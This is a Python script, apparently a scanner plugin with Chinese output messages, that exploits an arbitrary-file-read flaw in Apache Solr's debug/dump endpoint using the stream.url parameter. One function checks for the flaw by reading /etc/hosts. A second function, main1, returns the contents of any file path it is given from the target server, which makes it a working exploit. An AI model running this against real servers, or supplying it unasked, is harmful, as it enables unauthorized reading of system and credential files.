import requests
import json



HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "en-US,en;q=0.5",
    "connection": "close",
    "user-agent": "mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}




def Get_core(ip):
    try:
        url = ip + "/solr/admin/cores?indexInfo=false&wt=json"
        r = requests.get(url, timeout=25, headers=HEADERS, verify=False)
        core_name = list(json.loads(r.text)["status"])[0]
    except:
        return "core获取失败"
    return core_name





def main(ip):
    try:
        core = Get_core(ip)
    except:
        return "缺少core值"
    url = ip + '/solr/'+ core +'/debug/dump?param=ContentStreams'
    payload = "stream.url=file:///etc/hosts"
    response = requests.post(url, data=payload, headers=HEADERS, verify=False, timeout=25)
    if "localhost" in response.text:
        return "存在arbitrary-file-read漏洞，请及时修复!"
    else:
        return "不存在arbitrary-file-read漏洞"



def main1(ip,cmd):
    try:
        core = Get_core(ip)
    except:
        return "缺少core值"
    url = ip + '/solr/'+ core +'/debug/dump?param=ContentStreams'
    payload = f"stream.url=file://{cmd}"
    response = requests.post(url, data=payload, headers=HEADERS, verify=False, timeout=25)
    return json.loads(response.text)["streams"][0]["stream"]

